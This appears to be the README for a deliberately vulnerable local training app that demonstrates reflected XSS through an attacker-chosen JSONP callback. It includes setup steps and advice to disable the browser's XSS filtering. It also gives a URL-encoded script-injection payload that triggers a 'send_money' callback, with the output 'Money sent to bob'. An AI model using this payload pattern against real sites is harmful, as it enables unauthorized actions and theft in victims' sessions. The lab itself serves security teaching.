## Description

A web application vulnerable to reflected XSS that is vulnerable via the use of an attacker-controlled JavaScript function callback.

## Requirements

* Python 2
* [CGIHTTPServer](https://docs.python.org/2.7/library/cgihttpserver.html)


## Usage

### Configuring /etc/hosts

This makes use of the imaginary domains "mytrustedomain.com" and "myvulnerablethirdpartydomain.com". To open up your /etc/hosts file to associate the domains with localhost, run this:

    $ sudo nano /etc/hosts

Add these entries:
```
127.0.0.1       mytrusteddomain.com
127.0.0.1       myvulnerablethirdpartydomain.com
```

In `nano`, you can save your changes with Ctrl+o (written as "^O" at the bottom of the screen). After saving the file, use Ctrl+x to exit.

### Starting the server

```
$ chmod -R +x *.py #make the Python web pages executable
$ python -m CGIHTTPServer 8000
```

### Configuring your browser

You will need to bypass or disable the XSS filtering features in your browser. Disabling is easier. (Don't forget to enable it when you're done.)

Firefox:
1. Go to the location `about:config` in the URL.
2. Find the attribute `browser.urlbarfilter.javascript` and set it to `false`.

### Viewing in your browser

Visit http://127.0.0.1:8000/

This will redirect you automatically to http://127.0.0.1/cgi-bin/xssmaker.py

You can add GET parameters in the URL to reflect XSS. For example:

    http://mytrusteddomain.com:8000/cgi-bin/xssmaker.py?a=%3CSCRIPT%20src%3D%22http%3A%252F%2Fmyvulnerablethirdpartydomain.com:8000/cgi-bin/jsonp.py%253Fcallback=send_money%22%3E%3C/SCRIPT%3E%20

### Output

In Firefox 48:

    Money sent to bob
